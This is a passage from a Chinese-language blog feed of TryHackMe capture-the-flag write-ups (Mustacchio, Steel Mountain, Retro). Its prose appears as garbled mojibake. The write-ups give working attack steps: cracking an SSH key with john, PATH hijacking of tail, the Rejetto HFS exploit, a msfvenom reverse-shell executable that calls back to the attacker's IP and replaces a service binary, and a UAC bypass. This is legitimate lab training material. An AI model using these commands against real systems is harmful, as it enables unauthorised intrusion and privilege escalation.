class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015154516232-8958968.png" alt="image-20241015154505258"></p><p>ÊàêÂäüËØªÂèñÂà∞ÁßÅÈí•ÔºåÂ∞ÜÂÖ∂‰øùÂ≠òËá≥<code>id_rsa</code>Êñá‰ª∂**ÔºàÊ≥®ÊÑèÊ†ºÂºèÔºâ**ÔºåÂπ∂Ëµã‰∫à<code>600</code>ÊùÉÈôêÔºåÁàÜÁ†¥Âä†ÂØÜÁßÅÈí•ÁöÑÂØÜÁ†Å</p><p>Âà©Áî®sshÈÄöËøáÁßÅÈí•ÁôªÂΩïÁöÑÊñπÂºèÂ∏∏ÁÜüÁôªÂΩïBarryÁî®Êà∑</p><p>ÂÖàÂ∞Ü<code>id_rsa</code>ËΩ¨Êç¢ÊàêhashÊ†ºÂºè</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155431516-1174663865.png" alt="image-20241015155420384"></p><p>‰ΩøÁî®johnÁàÜÁ†¥ÂØÜÁ†Å</p><p><code>john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155556279-2034530019.png" alt="image-20241015155545683"></p><p>ÂèëÁé∞ÂØÜÁ†Å<code>urieljames</code>Ôºå‰ΩøÁî®ÁßÅÈí•ÁôªÂΩïssh</p><p><code>ssh barry@10.10.235.246 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155820199-1962063428.png" alt="image-20241015155809630"></p><p>ÁôªÈôÜÊàêÂäü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155843741-2084925548.png" alt="image-20241015155833241"></p><p>Âú®ÂΩìÂâçÁõÆÂΩï‰∏ãÊâæÂà∞<code>user.txt</code></p><h1>ÊèêÂçáËá≥rootÊùÉÈôê</h1><h2 id="ÂØªÊâæÊèêÊùÉÁõÆÊ†á">ÂØªÊâæÊèêÊùÉÁõÆÊ†á</h2><p>‰ΩøÁî®<code>sudo -l</code>ËØïËØï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015160125542-1414416860.png" alt="image-20241015160114807"></p><p>ÂèëÁé∞Áî®‰∏ç‰∫ÜÔºåÂÜçËØïËØïfindÂëΩ‰ª§</p><p><code>find / -type f -perm -u=s 2&gt;/dev/null </code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015160354842-450932405.png" alt="image-20241015160335569"></p><p>Â§ßÂ§öÊï∞ÂëΩ‰ª§ÈÉΩÊó†Ê≥ïÂà©Áî®Ôºå‰ΩÜÊòØÂèëÁé∞Êúâ‰∏™‰∏çÂêåÁöÑÊñá‰ª∂<code>/home/joe/live_log</code>ÔºåÂèØ‰ª•Êü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015161626529-819413202.png" alt="image-20241015161615266"></p><p>ÂèëÁé∞ÊòØ‰∏Ä‰∏™elfÊñá‰ª∂ÔºåËøêË°å‰∏Ä‰∏ãËØïËØï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015161654143-1177441879.png" alt="image-20241015161642992"></p><p>ÂèëÁé∞ÊòØÊâìÂç∞ÁΩëÁ´ôÁöÑÊó•ÂøóÁöÑÂäüËÉΩ</p><p>‰ΩøÁî®stringsÊ£ÄÊü•‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015162050015-1226680986.png" alt="image-20241015162039262"></p><p>Ê£ÄÊü•ÂêéÂèëÁé∞Ëøô‰∏™Êñá‰ª∂Âú®ÊâßË°åÁöÑÊó∂ÂÄô‰ºöË∞ÉÁî®<code>tail</code>ÂëΩ‰ª§ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáÂä´ÊåÅËØ•ÂëΩ‰ª§ËøõË°åÊèêÊùÉ</p><h2 id="Âä´ÊåÅÁéØÂ¢ÉÂèòÈáèÊèêÊùÉ">Âä´ÊåÅÁéØÂ¢ÉÂèòÈáèÊèêÊùÉ</h2><p>ÂÖ∑‰ΩìÊìç‰ΩúÂ¶Ç‰∏ãÔºö</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash&#x27;</span> &gt; /tmp/tail</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; /tmp/tail</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/tail</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163243415-624662868.png" alt="image-20241015163231776"></p><p>ÂÜçËøêË°åÊó∂ÔºåÂ∞±‰ºöÊåâÁÖßÈ°∫Â∫èÊâßË°åÊàë‰ª¨ÊûÑÈÄ†ÁöÑ<code>tail</code>ÂëΩ‰ª§ÔºåÂØºËá¥ÊùÉÈôêÊèêÂçá</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163323308-831948752.png" alt="image-20241015163312818"></p><p>ÊàêÂäüÊèêÊùÉ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015163355336-310839046.png" alt="image-20241015163344478"></p><p>Âú®<code>/root</code>‰∏ãÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãMustacchio</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
    <category term="Linux" scheme="https://www.fomal.cc/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-Steel Mountain</title>
    <link href="https://www.fomal.cc/posts/e8bded00.html"/>
    <id>https://www.fomal.cc/posts/e8bded00.html</id>
    <published>2024-10-14T08:27:58.000Z</published>
    <updated>2024-10-27T12:35:07.285Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.51.252</p><p>ÊîªÂáªÊú∫ipÔºö10.14.90.122</p></blockquote><h1>ÂÜôÂú®ÂâçÈù¢</h1><p><strong>Ê≥®ÊÑèÔºöÊú∫Âô®‰∏çÂìçÂ∫îpingÂëΩ‰ª§</strong></p><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap --min-rate 10000 -Pn -sV -p- 10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014163927698-310950412.png" alt="image-20241014163917459"></p><p>ÂºÄÊîæËã•Âπ≤Á´ØÂè£Ôºå‰ΩÜÊòØÂèØ‰ª•ÁúãÂá∫ËøôÊòØ‰∏ÄÂè∞windows‰∏ªÊú∫</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014164050700-679057908.png" alt="image-20241014164041162"></p><p>‰∏Ä‰∏™ÊôÆÈÄöÁöÑÈ°µÈù¢ÔºåÊâ´‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.51.252/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014170550004-1267980203.png" alt="image-20241014170540647"></p><p>Ê≤°‰ªÄ‰πàÊúâÁî®‰ø°ÊÅØ</p><p>Êü•Áúã‰∏ãÊ∫êÁ†Å</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191706066-655513886.png" alt="image-20241014191656687"></p><p>ÊâæÂà∞‰∫∫Âêç<code>BillHarper</code></p><h2 id="SMB">SMB</h2><p><code>smbclient -L //10.10.51.252</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191226841-505937933.png" alt="image-20241014191217373"></p><p>‰∏çÂÖÅËÆ∏ÂåøÂêçÁôªÂΩï</p><h2 id="8080Á´ØÂè£">8080Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014191537845-1876392148.png" alt="image-20241014191528445"></p><p>ÂèëÁé∞ÊòØ‰∏Ä‰∏™Êñá‰ª∂ÊúçÂä°Âô®ÁâàÊú¨Âè∑ÊòØ<code>2.3</code>ÔºåÁÇπËøõÂéªÁúãÁúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014192448714-1892990057.png" alt="image-20241014192438848"></p><p>Âà∞ËøôÈáåÂ∞±Áü•ÈÅìËøô‰∏™ÊúçÂä°Âô®ÁöÑÂêçÂ≠ó‰∫Ü<code>Rejetto HTTP File Server</code></p><p>ÂèØ‰ª•Â∞ùËØïÂéªÁΩë‰∏äÊâæÊâæÊòØÂê¶ÊúâÂéÜÂè≤ÊºèÊ¥û</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193542336-1095577421.png" alt="image-20241014193532643"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193635486-838603181.png" alt="image-20241014193625312"></p><p>ÊâæÂà∞‰∏™<code>CVE-2014-6287</code></p><h1>Ëé∑ÂèñÂàùÂßãËÆøÈóÆÊùÉÈôê</h1><p>ÂêØÂä®msf</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014193829983-1899085758.png" alt="image-20241014193820488"></p><p>Áõ¥Êé•ÊêúÁ¥¢Ëøô‰∏™cveÂπ∂‰ΩøÁî®</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014194006026-989143443.png" alt="image-20241014193956689"></p><p>ÊääÂøÖË¶ÅÁöÑÂèÇÊï∞ËÆæÁΩÆ‰∏Ä‰∏ã</p><p>Áõ¥Êé•runÔºÅ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195051743-599602628.png" alt="image-20241014195042124"></p><p>Ëé∑ÂæóÂü∫Á°ÄÁî®Êà∑ÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014195133488-1609533962.png" alt="image-20241014195123919"></p><p>Âú®<code>C:\Users\bill\Desktop</code>ÊâæÂà∞<code>user.txt</code></p><h1>ÊèêÂçáËá≥rootÊùÉÈôê</h1><p>ËøôÂè∞Êú∫Âô®‰∏äÊúâ‰∫Ü‰∏Ä‰∏™ÂàùÂßã shellÔºåÊàë‰ª¨ÂèØ‰ª•Ëøõ‰∏ÄÊ≠•Êûö‰∏æÊìç‰ΩúÁ≥ªÁªü‰ø°ÊÅØÂπ∂Êü•ÁúãÂ∞ÜÊùÉÈôêÂçáÁ∫ßÂà∞rootÁöÑÂà©Áî®ÁÇπÔºå‰ΩøÁî®<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp</a>ÁöÑ<code>PowerShell</code>ËÑöÊú¨Êù•Êü•ÁúãËøôÂè∞ Windows Êú∫Âô®Âπ∂Á°ÆÂÆöÁõÆÊ†áÊú∫ÊòØÂê¶Â≠òÂú®‰ªª‰ΩïÂºÇÂ∏∏ÂíåÈîôËØØÈÖçÁΩÆ</p><p>Â∞ÜÊñá‰ª∂‰øùÂ≠òÂà∞Êú¨Âú∞ÔºåÈÄöËøámsf‰º†‰∏äÂéª</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200155434-17085404.png" alt="image-20241014200146045"></p><p>ÂèØ‰ª•ÈÄöËøá<code>meterpreter</code>‰ºöËØùÊù•Âä†ËΩΩ<code>PowerShell</code>Êâ©Â±ïÔºåÂπ∂ËøõÂÖ• <code>PowerShell</code>ÁöÑshellÁïåÈù¢Âπ∂ÊâßË°åËÑöÊú¨</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_shell</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014200617323-413379229.png" alt="image-20241014200607720"></p><p>ÂèëÁé∞Êúâ‰∏™ÁâπÂà´ÁöÑÊúçÂä°<code>CanRestart</code>ÈÄâÈ°πË¢´ËÆæÁΩÆ‰∏∫<code>true</code>ÔºåÂΩìËøô‰∏™ÈÄâÈ°π‰∏∫<code>true</code>Êó∂ÔºåÊàë‰ª¨Â∞±ËÉΩÂ§üÂú®Á≥ªÁªü‰∏äÈáçÊñ∞ÂêØÂä®Ê≠§ÊúçÂä°ÔºõËÄå‰∏îËøô‰∏™Â∫îÁî®Á®ãÂ∫èÁöÑÁõÆÂΩï‰πüÊòØÂèØÂÜôÁöÑÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÂèØ‰ª•Áî®‰∏Ä‰∏™ÊÅ∂ÊÑèÂ∫îÁî®Á®ãÂ∫èÊõøÊç¢ÂêàÊ≥ïÁöÑÂ∫îÁî®Á®ãÂ∫èÔºå‰∏ÄÊó¶ÊúçÂä°ÈáçÊñ∞ÂêØÂä®ÔºåÊàë‰ª¨ÁöÑÊÅ∂ÊÑèÁ®ãÂ∫èÂ∞ÜËøêË°å</p><blockquote><p>ServiceName ÔºöAdvancedSystemCareService9</p><p>ModifiablePathÔºöC:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe</p></blockquote><p><code>msfvenom</code>ÂèØÁî®‰∫éÁîüÊàêÂèçÂêëshellÁöÑpayloadÂπ∂Â∞ÜÂÖ∂ËæìÂá∫‰∏∫<code>windows</code>ÂèØÊâßË°åÊñá‰ª∂ÔºåÊàë‰ª¨Áî®<code>msfvenom</code>Êù•ÁîüÊàê‰∏Ä‰∏™Âíå‰πãÂâçÁöÑÂ∫îÁî®Á®ãÂ∫èÂêåÂêçÁöÑÊÅ∂ÊÑèÂ∫îÁî®Á®ãÂ∫è:</p><p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.14.90.122 LPORT=4444 -e x86/shikata_ga_nai -f exe -o ASCService.exe</code></p><p>Âú® <code>meterpreter</code> ‰∏≠‰∏ä‰º†Êñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201549634-483647248.png" alt="image-20241014201539989"></p><p>ËøõÂÖ•shellÔºåÂÖàÂ∞ÜËøô‰∏™ÊúçÂä°ÂÅúÊéâÔºåÊõøÊç¢Êàë‰ª¨ÁöÑÊñá‰ª∂</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">sc</span> stop AdvancedSystemCareService9</span><br><span class="line"><span class="built_in">copy</span> ASCService.exe <span class="string">&quot;C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201806112-808045312.png" alt="image-20241014201756699"></p><p>ÂÖ≥‰∫éSCÂëΩ‰ª§ÔºàWindows shell‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôÔºâÔºö</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SC</span>ÂëΩ‰ª§ÁöÑÊ†ºÂºèÔºö<span class="built_in">SC</span> [<span class="type">Servername</span>] command Servicename [<span class="type">Optionname</span>= <span class="type">Optionvalues</span>]</span><br><span class="line"></span><br><span class="line">ServernameÔºöÊåáÂÆöÊúçÂä°ÊâÄÂú®ÁöÑËøúÁ®ãÊúçÂä°Âô®ÁöÑÂêçÁß∞„ÄÇÂêçÁß∞ÂøÖÈ°ªÈááÁî®ÈÄöÁî®ÂëΩÂêçÁ∫¶ÂÆö (UNC) Ê†ºÂºèÔºà‚Äú\\myserver‚ÄùÔºâ„ÄÇÂ¶ÇÊûúÊòØÂú®Êú¨Âú∞ËøêË°åSC.exeÔºåËØ∑ÂøΩÁï•Ê≠§ÂèÇÊï∞„ÄÇ</span><br><span class="line">command ÔºöÂ¶Çquery,<span class="built_in">start</span>,stop,create,configÁ≠â</span><br><span class="line"></span><br><span class="line">ServicenameÔºöÊúçÂä°ÂêçÔºå‰πüÂ∞±ÊòØË¶ÅÈÖçÁΩÆÁöÑÈÇ£‰∏™ÊúçÂä°ÁöÑÂêçÂ≠óÔºå‰æãÂ¶Ç‰Ω†Ë¶ÅÂêØÂä®‰∏Ä‰∏™ÊúçÂä°‰Ω†Â∞±ËæìÂÖ•<span class="built_in">sc</span> <span class="built_in">start</span> +‰Ω†Ë¶ÅÂêØÂä®ÁöÑÊúçÂä°ÂêçÁß∞ÔºàÂπ∂ÈùûÊòØÊúçÂä°ÊòæÁ§∫ÂêçÁß∞Ôºâ„ÄÇ</span><br><span class="line">Optionname= OptionvaluesÔºöÊòØÈÄâÈ°πÂêçÂíåÈÄâÈ°πÁöÑÂÄº„ÄÇ</span><br></pre></td></tr></table></figure><p>Âú®ÈáçÂêØÊúçÂä°‰πãÂâçÔºåÂú®Êàë‰ª¨ÁöÑÊú∫Âô®‰∏äÂÖàÂêØÂä®‰∏™ÁõëÂê¨</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201838886-990526090.png" alt="image-20241014201829234"></p><p>ÁÑ∂ÂêéÂú®Èù∂Êú∫‰∏≠ÈáçÂêØÊúçÂä°</p><p><code>sc start AdvancedSystemCareService9</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014201912815-1720693336.png" alt="image-20241014201903513"></p><p>ËøôÊó∂Â∞±ÊèêÂçáÂà∞‰∫ÜrootÊùÉÈôê</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241014202038317-726923127.png" alt="image-20241014202028946"></p><p>Âú®<code>C:\Users\Administrator\Desktop</code>ÊâæÂà∞<code>root.txt</code></p>]]></content>
    
    
    <summary type="html">TryHackMeÁ≥ªÂàó‰πãSteel Mountain</summary>
    
    
    
    <category term="TryHackMe" scheme="https://www.fomal.cc/categories/TryHackMe/"/>
    
    
    <category term="Windows" scheme="https://www.fomal.cc/tags/Windows/"/>
    
    <category term="THM" scheme="https://www.fomal.cc/tags/THM/"/>
    
  </entry>
  
  <entry>
    <title>THM-Retro</title>
    <link href="https://www.fomal.cc/posts/70f6e376.html"/>
    <id>https://www.fomal.cc/posts/70f6e376.html</id>
    <published>2024-10-12T03:46:11.000Z</published>
    <updated>2024-10-27T12:34:49.300Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.52.12</p><p>ÊîªÂáªÊú∫ipÔºö10.14.90.122</p></blockquote><h1>ÂÜôÂú®ÂâçÈù¢</h1><p><strong>Ê≥®ÊÑèÔºöÊú∫Âô®‰∏çÂìçÂ∫îpingÂëΩ‰ª§</strong></p><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap --min-rate 10000 -Pn -sV -p- 10.10.52.12</code></p><p>ËøôÈáå‰ΩøÁî®<code>-Pn</code>ÂèÇÊï∞ÁªïËøápingÂëΩ‰ª§ÁöÑÊ£ÄÊü•</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012124425580-746515289.png" alt="image-20241012124417135"></p><p>ÂèëÁé∞Âè™ÂºÄÊîæ‰∫Ü80Âíå3389Á´ØÂè£ÔºåËøôÊÑèÂë≥ÁùÄÂΩìÊàë‰ª¨ÊãøÂà∞‰∏ÄÁªÑÂá≠ÊçÆÂêéÔºåÂèØ‰ª•ÈÄöËøá rdpÁôªÂΩïÁõÆÊ†á‰∏ªÊú∫</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012125109670-1625718676.png" alt="image-20241012125102563"></p><p>ÊòØ‰∏Ä‰∏™<code>windows server</code>ÈªòËÆ§ÁöÑIISÊúçÂä°</p><p>Êâ´Êèè‰∏Ä‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.52.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012141145765-33043048.png" alt="image-20241012141138353"></p><p>ËÆøÈóÆ‰∏Ä‰∏ã<code>/retro</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143041958-931600745.png" alt="image-20241012143034753"></p><p>Âú®È°µÈù¢ÊúÄ‰∏ãÈù¢ÂèëÁé∞ÊñáÁ´†<code>Ready Player One</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143406701-1000163975.png" alt="image-20241012143359676"></p><p>Ê†πÊçÆÊñáÁ´†ÊÑèÊÄùÁåúÊµãËøôÊòØ‰∏ÄÁªÑÁôªÂΩïÂá≠ÊçÆ<code>Wade : parzival</code></p><h1>RDPÁôªÂΩïËøúÁ®ã‰∏ªÊú∫</h1><p>ÊãøÂà∞‰∏ÄÁªÑÁî®Êà∑Âá≠ÊçÆÔºåÁªìÂêà‰πãÂâçÁöÑ3389Á´ØÂè£ÂºÄÊîæÔºåÂ∞ùËØïÁôªÂΩï</p><p><code>xfreerdp /u:Wade /p:parzival /cert:ignore /v:10.10.52.12</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012143946216-981286449.png" alt="image-20241012143938820"></p><p>ÁôªÈôÜÊàêÂäü</p><p>Âπ∂Âú®Ê°åÈù¢ÊâæÂà∞user.txt</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144100422-25041175.png" alt="image-20241012144053438"></p><h1>WindowsÊèêÊùÉ</h1><p>ÂÖàËøõË°åwindows‰∏ªÊú∫‰ø°ÊÅØÊêúÈõÜ</p><p>Ê°åÈù¢‰∏äÊúâ‰∏™ÊµèËßàÂô®ÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144614643-1652594324.png" alt="image-20241012144607785"></p><p>ÂèëÁé∞ËØ•Áî®Êà∑Êî∂Ëóè‰∫Ü‰∏Ä‰∏™cveÁöÑÈ°µÈù¢ÔºåÊü•Áúã‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012144928489-1007257350.png" alt="image-20241012144921303"></p><p>ÊòØ<code>CVE-2019-1388</code></p><p>Êàë‰ª¨ÂèëÁé∞ÁõÆÊ†áÊú∫ÁöÑÊµèËßàÂô®‰∏≠Êúâ<code>CVE-2019-1388</code>ÁöÑÂéÜÂè≤ËÆøÈóÆËÆ∞ÂΩï‚ÄìÁåúÊµãÁî®Êà∑ÂèØËÉΩÊòØÊÉ≥ÈíàÂØπCVE-2019-1388ÊºèÊ¥ûÊâìË°•‰∏ÅÔºå‰πüÂ∞±ÊòØËØ¥ÁõÆÊ†áÊú∫Âô®ÂèØËÉΩÂ≠òÂú®<code>CVE-2019-1388</code>ÊºèÊ¥û</p><p>ÁªèËøá‰ø°ÊÅØÊêúÁ¥¢ÂèØÁü•<code>CVE-2019-1388</code>ÊòØ‰∏Ä‰∏™UACÊèêÊùÉÊºèÊ¥ûÔºåËØ•ÊºèÊ¥ûÁöÑÂü∫Êú¨‰ø°ÊÅØÂ¶Ç‰∏ãÔºö</p><blockquote><p><strong>UAC</strong>:Áî®Êà∑Â∏êÊà∑ÊéßÂà∂(User Account Control)ÊòØÂæÆËΩØÂÖ¨Âè∏Âú®ÂÖ∂Windows VistaÂèäÊõ¥È´òÁâàÊú¨Êìç‰ΩúÁ≥ªÁªü‰∏≠ÈááÁî®ÁöÑ‰∏ÄÁßçÊéßÂà∂Êú∫Âà∂„ÄÇÂÖ∂ÂéüÁêÜÊòØÈÄöÁü•Áî®Êà∑ÊòØÂê¶ÂØπÂ∫îÁî®Á®ãÂ∫è‰ΩøÁî®Á°¨ÁõòÈ©±Âä®Âô®ÂíåÁ≥ªÁªüÊñá‰ª∂ÊéàÊùÉÔºå‰ª•ËææÂà∞Â∏ÆÂä©ÈòªÊ≠¢ÊÅ∂ÊÑèÁ®ãÂ∫èÔºàÊúâÊó∂‰πüÁß∞‰∏∫‚ÄúÊÅ∂ÊÑèËΩØ‰ª∂‚ÄùÔºâÊçüÂùèÁ≥ªÁªüÁöÑÊïàÊûú„ÄÇ</p></blockquote><blockquote><p><strong>CVE-2019-1388</strong>ÔºöËØ•ÊºèÊ¥û‰Ωç‰∫éWindowsÁöÑUACÔºàUser Account ControlÔºåÁî®Êà∑Â∏êÊà∑ÊéßÂà∂ÔºâÊú∫Âà∂‰∏≠„ÄÇÂú®ÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåWindows‰ºöÂú®‰∏Ä‰∏™ÂçïÁã¨ÁöÑÊ°åÈù¢‰∏äÊòæÁ§∫ÊâÄÊúâÁöÑUACÊèêÁ§∫ Secure DesktopÔºõËøô‰∫õÊèêÁ§∫ÊòØÁî±Âêç‰∏∫ consent.exe ÁöÑÂèØÊâßË°åÊñá‰ª∂‰∫ßÁîüÁöÑÔºåËØ•ÂèØÊâßË°åÊñá‰ª∂‰ª•NT AUTHORITY\SYSTEMÊùÉÈôêËøêË°åÔºåÂÆåÊï¥ÊÄßÁ∫ßÂà´‰∏∫System„ÄÇ</p><p>Âõ†‰∏∫Áî®Êà∑ÂèØ‰ª•‰∏éËØ•UI‰∫§‰∫íÔºåÂõ†Ê≠§ÂØπUIÊù•ËØ¥Á¥ßÈôêÂà∂ÊòØÂøÖÈ°ªÁöÑÔºåÂê¶ÂàôÔºå‰ΩéÊùÉÈôêÁöÑÁî®Êà∑ÂèØËÉΩÂèØ‰ª•ÈÄöËøáUIÊìç‰ΩúÁöÑÂæ™ÁéØË∑ØÁî±‰ª•SYSTEMÊùÉÈôêÊâßË°åÊìç‰ΩúÔºåÂç≥‰ΩøÈöîÁ¶ªÁä∂ÊÄÅÁöÑÁúã‰ººÊó†ÂÆ≥ÁöÑUIÁâπÂæÅÈÉΩÂèØËÉΩ‰ºöÊàê‰∏∫ÂºïÂèë‰ªªÊÑèÊéßÂà∂ÁöÑÂä®‰ΩúÈìæÁöÑÁ¨¨‰∏ÄÊ≠•„ÄÇ</p><p><a href="https://github.com/jas502n/CVE-2019-1388">CVE-2019-1388ÊºèÊ¥ûÂà©Áî®</a></p></blockquote><h2 id="Âà©Áî®UACÊºèÊ¥ûÊèêÊùÉ">Âà©Áî®UACÊºèÊ¥ûÊèêÊùÉ</h2><p>Êàë‰ª¨ÈúÄË¶ÅÈÄöËøáÊâßË°å<code>hhupd.exe</code>Êñá‰ª∂Êù•ÂÆåÊàêÂØπCVE-2019-1388ÁöÑÂà©Áî®ÔºåÂú®ÁõÆÊ†áÊú∫Áî®Êà∑Wade Ê°åÈù¢‰∏äÁöÑÂõûÊî∂Á´ô‰∏≠Êàë‰ª¨ÂèØ‰ª•ÊâæÂà∞<code>hhupd.exe</code>Êñá‰ª∂‚Äî‚ÄîÊàë‰ª¨ÊâãÂä®ÊÅ¢Â§çËØ•Êñá‰ª∂Âç≥ÂèØ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145533318-1767894072.png" alt="image-20241012145525730"></p><p>Âè≥ÈîÆÂçïÂáªhhupd.exeÊñá‰ª∂Âπ∂ÈÄâÊã©‰ª•ÁÆ°ÁêÜÂëòË∫´‰ªΩËøêË°åÂÆÉÔºåÁÑ∂ÂêéÂÖàÁÇπÂáª&quot;ÊòæÁ§∫Êõ¥Â§öËØ¶ÁªÜ‰ø°ÊÅØ&quot;ÔºåÂÜçÁªßÁª≠ÁÇπÂáª&quot;ÊòæÁ§∫ÊúâÂÖ≥ÂèëÂ∏ÉËÄÖËØÅ‰π¶ÁöÑ‰ø°ÊÅØ&quot;</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145637747-550169434.png" alt="image-20241012145630586"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145657684-1224412202.png" alt="image-20241012145647626"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241012145719391-978453998.png" alt="image-20241012145712577"></p><p><img src="https://img2023.cnblogs.com/blog/2857591/202303/2857591-20230308122357026-1060167176.png" 